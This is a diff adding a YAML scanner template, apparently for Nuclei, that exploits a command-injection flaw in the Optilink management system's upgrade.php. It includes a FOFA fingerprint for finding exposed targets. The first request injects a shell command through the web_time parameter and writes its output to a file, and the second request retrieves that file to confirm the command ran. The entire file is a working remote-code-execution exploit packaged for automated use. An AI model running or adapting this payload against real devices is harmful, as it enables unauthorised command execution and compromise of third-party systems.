@@ -1,0 +1,44 @@
+id: poc-pl3ylax7bs6693pi
+info:
+  name: Optilink 管理系统 upgrade.php 任意命令执行漏洞
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/pl3ylax7bs6693pi'
+  tags: rce,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: pl3ylax7bs6693pi
+    fofa: body="/html/css/dxtdata.css"
+http:
+- raw:
+  - 'GET /cgi/fsystem/upgrade.php?time=1&web_time=;ls>1.txt; HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+
+    Connection: keep-alive
+
+    Accept-Encoding: gzip, deflate, br'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'GET /cgi/fsystem/1.txt HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+
+    Connection: keep-alive
+
+    Content-Type: application/x-www-form-urlencoded
+
+    Accept-Encoding: gzip, deflate, br'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
